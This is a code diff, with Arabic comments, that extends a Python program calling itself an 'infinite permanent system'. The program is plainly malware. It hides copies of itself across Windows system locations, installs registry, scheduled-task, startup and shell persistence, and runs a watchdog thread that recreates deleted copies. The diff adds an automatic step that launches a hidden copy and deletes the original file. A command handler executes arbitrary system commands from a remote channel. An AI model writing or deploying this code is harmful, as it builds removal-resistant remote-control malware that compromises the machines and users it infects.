@@ -1369,6 +1369,8 @@ class IndependentReplicationSystem:
         self.original_path = os.path.abspath(__file__)
         self.system_locations = self.get_system_locations()
         self.backup_copies = []
+        self.creation_lock = threading.Lock()  # أضفنا Lock لمنع التكرار
+        self.initial_creation_done = False     # لتتبع الإنشاء الأولي
         
     def get_system_locations(self):
         """مواقع نظامية متعددة للنسخ"""
@@ -1384,22 +1386,34 @@ class IndependentReplicationSystem:
         """إنشاء نسخ متعددة في مواقع مختلفة"""
         created_copies = []
         
+        print("🔍 فحص الملفات الحالية...")
+        for location in self.system_locations:
+            if os.path.exists(location):
+                print(f"   ✅ موجود: {os.path.basename(location)}")
+            else:
+                print(f"   ❌ مفقود: {os.path.basename(location)}")
+        
         for location in self.system_locations:
             try:
                 # إنشاء المجلد إذا لم يكن موجوداً
                 os.makedirs(os.path.dirname(location), exist_ok=True)
                 
-                # نسخ الملف
-                shutil.copy2(self.original_path, location)
-                
-                # إخفاء الملف
-                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
-                
-                created_copies.append(location)
-                print(f"✅ نسخة: {os.path.basename(location)}")
+                # التحقق إذا كان الملف موجوداً بالفعل
+                if not os.path.exists(location):
+                    # نسخ الملف
+                    shutil.copy2(self.original_path, location)
+                    
+                    # إخفاء الملف
+                    subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
+                    
+                    created_copies.append(location)
+                    print(f"✅ إنشاء: {os.path.basename(location)}")
+                else:
+                    print(f"⚠️  موجود مسبقاً: {os.path.basename(location)}")
+                    created_copies.append(location)
                 
             except Exception as e:
-                print(f"⚠️  فشل نسخ: {location}")
+                print(f"❌ فشل نسخ {location}: {e}")
         
         self.backup_copies = created_copies
         return created_copies
@@ -1551,57 +1565,133 @@ class IndependentReplicationSystem:
         except Exception as e:
             return 0
     
-    def start_continuous_protection(self):
-        """بدء حماية مستمرة للنسخ"""
+    def start_intelligent_protection(self):
+        """بدء حماية ذكية للنسخ"""
         def protection_worker():
+            # انتظر قليلاً في البداية
+            time.sleep(3)
+            
+            protection_cycle = 0
             while True:
                 try:
-                    # التحقق من جميع النسخ
-                    for location in self.system_locations:
-                        if not os.path.exists(location):
-                            print(f"🔄 إعادة إنشاء نسخة محذوفة: {os.path.basename(location)}")
-                            shutil.copy2(self.original_path, location)
-                            subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
+                    protection_cycle += 1
                     
-                    # التأكد من وجود 3 نسخ على الأقل
-                    existing_copies = [loc for loc in self.system_locations if os.path.exists(loc)]
-                    if len(existing_copies) < 3:
-                        print("🔄 إنشاء نسخ إضافية...")
-                        self.create_multiple_copies()
+                    # استخدام Lock لمنع التكرار
+                    with self.creation_lock:
+                        missing_files = []
+                        existing_files = []
+                        
+                        # فحص جميع المواقع
+                        for location in self.system_locations:
+                            if os.path.exists(location):
+                                existing_files.append(os.path.basename(location))
+                            else:
+                                missing_files.append(os.path.basename(location))
+                        
+                        # طباعة تقرير كل 10 دورات فقط
+                        if protection_cycle % 10 == 0:
+                            print(f"📊 تقرير الحماية - الدورة #{protection_cycle}")
+                            print(f"   ✅ الملفات النشطة: {len(existing_files)}")
+                            if missing_files:
+                                print(f"   ❌ الملفات المفقودة: {missing_files}")
+                        
+                        # إعادة إنشاء الملفات المفقودة
+                        if missing_files:
+                            print(f"🔄 اكتشاف {len(missing_files)} ملف مفقود: {missing_files}")
+                            
+                            for location in self.system_locations:
+                                if not os.path.exists(location):
+                                    try:
+                                        print(f"   🔨 جاري إنشاء: {os.path.basename(location)}")
+                                        shutil.copy2(self.original_path, location)
+                                        subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
+                                        print(f"   ✅ تم إنشاء: {os.path.basename(location)}")
+                                        
+                                        # انتظر بين كل إنشاء
+                                        time.sleep(1)
+                                        
+                                    except Exception as e:
+                                        print(f"   ❌ فشل إنشاء {os.path.basename(location)}: {e}")
                     
-                    time.sleep(5)  # فحص كل 5 ثواني
+                    # فاصل أطول بين الدورات
+                    time.sleep(15)  # 15 ثانية بدلاً من 5
                     
                 except Exception as e:
-                    time.sleep(10)
+                    print(f"⚠️ خطأ في الحماية: {e}")
+                    time.sleep(20)
         
-        # تشغيل 3 خيوط حماية
-        for i in range(3):
-            thread = threading.Thread(target=protection_worker, daemon=True)
-            thread.start()
+        # تشغيل خيط حماية واحد فقط بدلاً من 3
+        thread = threading.Thread(target=protection_worker, daemon=True)
+        thread.start()
+        print("🛡️ بدء نظام الحماية الذكية (خيط واحد)")
     
     def install_complete_independent_system(self):
         """تثبيت النظام المستقل الكامل"""
-        print("🔄 إنشاء نسخ متعددة...")
-        self.create_multiple_copies()
+        print("=" * 50)
+        print("🤖 بدء تثبيت النظام المستقل...")
+        print("=" * 50)
         
-        print("📝 تثبيت الريجستري...")
+        # 1. إنشاء النسخ
+        print("\n📁 المرحلة 1: إنشاء النسخ الاحتياطية...")
+        copies = self.create_multiple_copies()
+        print(f"   📊 النتيجة: {len(copies)} من أصل {len(self.system_locations)} نسخة")
+        
+        # 2. تثبيت الريجستري
+        print("\n📝 المرحلة 2: تثبيت إدخالات الريجستري...")
         reg_count = self.install_registry_with_multiple_paths()
+        print(f"   📊 النتيجة: {reg_count} إدخال ريجستري")
         
-        print("⏰ تثبيت المهام المجدولة...")
+        # 3. تثبيت المهام المجدولة
+        print("\n⏰ المرحلة 3: تثبيت المهام المجدولة...")
         task_count = self.install_scheduled_tasks_with_multiple_paths()
+        print(f"   📊 النتيجة: {task_count} مهمة مجدولة")
         
-        print("🚀 تثبيت بدء التشغيل...")
+        # 4. تثبيت بدء التشغيل
+        print("\n🚀 المرحلة 4: تثبيت بدء التشغيل...")
         startup_count = self.install_startup_with_multiple_paths()
+        print(f"   📊 النتيجة: {startup_count} ملف بدء تشغيل")
         
-        print("🐚 تثبيت إدخالات Shell...")
+        # 5. تثبيت Shell
+        print("\n🐚 المرحلة 5: تثبيت إدخالات Shell...")
         shell_count = self.install_shell_entries_with_multiple_paths()
+        print(f"   📊 النتيجة: {shell_count} إدخال Shell")
         
-        print("🛡️ بدء الحماية المستمرة...")
-        self.start_continuous_protection()
+        # 6. بدء الحماية
+        print("\n🛡️ المرحلة 6: بدء نظام الحماية...")
+        self.start_intelligent_protection()
         
         total = reg_count + task_count + startup_count + shell_count
-        print(f"✅ تم تثبيت {total} طريقة تشغيل تلقائي!")
+        print(f"\n🎯 الإجمالي: {total} طريقة تشغيل تلقائي!")
+        print("🤖 النظام المستقل جاهز - يمكن حذف الملف الأصلي!")
         return total
+
+    def delete_original_and_switch(self):
+        """حذف الملف الأصلي والتبديل للنسخ الاحتياطية"""
+        try:
+            if os.path.exists(self.original_path):
+                print("🗑️ جاري حذف الملف الأصلي والتبديل للنسخ الاحتياطية...")
+                
+                # تشغيل نسخة احتياطية أولاً
+                if self.backup_copies:
+                    backup_path = self.backup_copies[0]
+                    if os.path.exists(backup_path):
+                        python_exe = sys.executable
+                        subprocess.Popen([python_exe, backup_path], 
+                                       stdout=subprocess.DEVNULL,
+                                       stderr=subprocess.DEVNULL,
+                                       stdin=subprocess.DEVNULL,
+                                       creationflags=subprocess.CREATE_NO_WINDOW)
+                        print("🚀 تم تشغيل النسخة الاحتياطية")
+                
+                # ثم حذف الملف الأصلي
+                time.sleep(2)
+                os.remove(self.original_path)
+                print("✅ تم حذف الملف الأصلي")
+                
+                return True
+        except Exception as e:
+            print(f"⚠️ لم يتم حذف الملف الأصلي: {e}")
+            return False
 
 # === النظام اللانهائي مع النسخ المستقل ===
 class InfinitePermanentSystem:
@@ -1612,7 +1702,7 @@ class InfinitePermanentSystem:
         self.registered = False
         self.original_path = os.path.abspath(__file__)
         self.encryption = EncryptionSystem()
-        self.replication = IndependentReplicationSystem()  # <-- أضفنا النظام المستقل هنا
+        self.replication = IndependentReplicationSystem()
         
         # أسماء نظام Windows الحقيقية والمختلفة
         self.system_names = [
@@ -1832,6 +1922,15 @@ class InfinitePermanentSystem:
         """تثبيت نظام النسخ المستقل الجديد"""
         print("🤖 تثبيت النظام المستقل - البقاء بعد الحذف...")
         return self.replication.install_complete_independent_system()
+
+    def delete_original_and_switch_to_backup(self):
+        """حذف الملف الأصلي والتبديل للنسخ الاحتياطية"""
+        print("🔄 بدء عملية الحذف والتبديل...")
+        success = self.replication.delete_original_and_switch()
+        if success:
+            print("🎯 النظام الآن يعمل من النسخ الاحتياطية فقط!")
+            print("🔒 الملف الأصلي تم حذفه بنجاح")
+        return success
     
     def start_mutual_monitoring(self):
         """بدء المراقبة المتبادلة بين النسخ"""
@@ -1990,6 +2089,9 @@ class InfinitePermanentSystem:
                 return self.get_eternal_status()
             elif command.strip() == "independent_status":
                 return self.get_independent_status()
+            elif command.strip() == "delete_original":
+                result = self.delete_original_and_switch_to_backup()
+                return "✅ تم حذف الملف الأصلي والتبديل للنسخ الاحتياطية" if result else "❌ فشل الحذف"
             
             # تنفيذ أوامر النظام
             startupinfo = subprocess.STARTUPINFO()
@@ -2035,6 +2137,7 @@ class InfinitePermanentSystem:
         """الحصول على معلومات النظام"""
         try:
             independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
+            original_exists = os.path.exists(self.original_path)
             
             info = f"""
 🔒 INFINITE PERMANENT SYSTEM - ETERNAL
@@ -2057,6 +2160,7 @@ class InfinitePermanentSystem:
 🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
 ⚡ Uptime: {self.get_uptime()}
 🛡️ Protection: INFINITE + INDEPENDENT
+🗑️  Original File: {'EXISTS' if original_exists else 'DELETED'}
 
 💾 SYSTEM HEALTH:
 📈 CPU: {psutil.cpu_percent()}%
@@ -2067,6 +2171,7 @@ class InfinitePermanentSystem:
 🔒 Survives Deletion: YES
 🔄 Auto-Replication: ACTIVE
 📁 Backup Locations: {len(self.replication.system_locations)}
+🎯 Auto-Delete: ENABLED
 """
             return info
         except:
@@ -2081,6 +2186,7 @@ class InfinitePermanentSystem:
             'active_backups': len(existing_copies),
             'survives_deletion': len(existing_copies) >= 3,
             'protection_active': True,
+            'auto_delete_enabled': True,
             'timestamp': time.time()
         }
         return json.dumps(status, indent=2)
@@ -2096,13 +2202,20 @@ class InfinitePermanentSystem:
             'uptime': self.get_uptime(),
             'timestamp': time.time(),
             'version': 'INFINITE_1.0',
-            'independent_system': True
+            'independent_system': True,
+            'auto_delete': True
         }
         return json.dumps(status, indent=2)
     
     def get_status(self):
         independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
-        return f"♾️ INFINITE + INDEPENDENT - Copies: {len(self.hidden_copies)} - Independent: {independent_copies} - Connected: {self.registered}"
+        original_exists = os.path.exists(self.original_path)
+        status = "♾️ INFINITE + INDEPENDENT"
+        status += f" - Copies: {len(self.hidden_copies)}"
+        status += f" - Independent: {independent_copies}"
+        status += f" - Connected: {self.registered}"
+        status += f" - Original: {'EXISTS' if original_exists else 'DELETED'}"
+        return status
     
     def get_uptime(self):
         try:
@@ -2123,6 +2236,7 @@ class InfinitePermanentSystem:
             exists = "✅" if os.path.exists(path) else "❌"
             locations_info += f"{i}. {exists} {os.path.basename(path)} → {os.path.dirname(path)}\n"
         
+        locations_info += f"\n🗑️  ORIGINAL FILE: {'✅ EXISTS' if os.path.exists(self.original_path) else '❌ DELETED'}\n"
         return locations_info
     
     def reinforce_system(self):
@@ -2130,7 +2244,7 @@ class InfinitePermanentSystem:
             copies_count = self.create_infinite_copies()
             persistence_count = self.install_eternal_persistence()
             independent_count = self.install_independent_replication_system()
-            return f"♾️ ETERNAL REINFORCEMENT:\n- Created {copies_count} infinite copies\n- Added {persistence_count} eternal methods\n- Installed {independent_count} independent system\n- System SURVIVES DELETION"
+            return f"♾️ ETERNAL REINFORCEMENT:\n- Created {copies_count} infinite copies\n- Added {persistence_count} eternal methods\n- Installed {independent_count} independent system\n- System SURVIVES DELETION\n- Auto-Delete: ENABLED"
         except Exception as e:
             return f"Reinforcement failed: {e}"
     
@@ -2167,10 +2281,20 @@ class InfinitePermanentSystem:
         print("🌐 STARTING ETERNAL COMMUNICATION...")
         self.start_eternal_communication()
         
+        # 7. حذف الملف الأصلي تلقائياً بعد 10 ثواني
+        print("⏰ SCHEDULING AUTO-DELETE OF ORIGINAL FILE...")
+        def auto_delete():
+            time.sleep(10)
+            self.delete_original_and_switch_to_backup()
+        
+        delete_thread = threading.Thread(target=auto_delete, daemon=True)
+        delete_thread.start()
+        
         print("=" * 60)
         print("♾️ INFINITE PERMANENT SYSTEM IS NOW ACTIVE")
         print("🔒 SYSTEM IS ETERNAL - CANNOT BE STOPPED")
         print("🤖 INDEPENDENT - SURVIVES DELETION")
+        print("🗑️  AUTO-DELETE - ORIGINAL WILL BE DELETED SHORTLY")
         print("📡 LISTENING FOR ETERNAL COMMANDS...")
         print("=" * 60)
         
@@ -2185,7 +2309,10 @@ class InfinitePermanentSystem:
                 loop_count += 1
                 if loop_count % 30 == 0:  # كل 5 دقائق تقريباً
                     independent_copies = len([loc for loc in self.replication.system_locations if os.path.exists(loc)])
-                    print(f"♾️ Eternal system active - Loop #{loop_count} - Independent: {independent_copies} copies")
+                    original_exists = os.path.exists(self.original_path)
+                    print(f"♾️ Eternal system active - Loop #{loop_count}")
+                    print(f"   Independent: {independent_copies} copies")
+                    print(f"   Original: {'EXISTS' if original_exists else 'DELETED'}")
                 
                 time.sleep(10)
                 
@@ -2207,6 +2334,7 @@ def main():
 if __name__ == "__main__":
     print("♾️ INFINITE PERMANENT SYSTEM - ETERNAL EDITION")
     print("🤖 NOW WITH INDEPENDENT REPLICATION - SURVIVES DELETION")
+    print("🗑️  AUTO-DELETE FEATURE - ORIGINAL FILE WILL BE DELETED")
     print("🔒 THIS SYSTEM CANNOT BE STOPPED - EVEN IF DELETED")
     main()'''
         
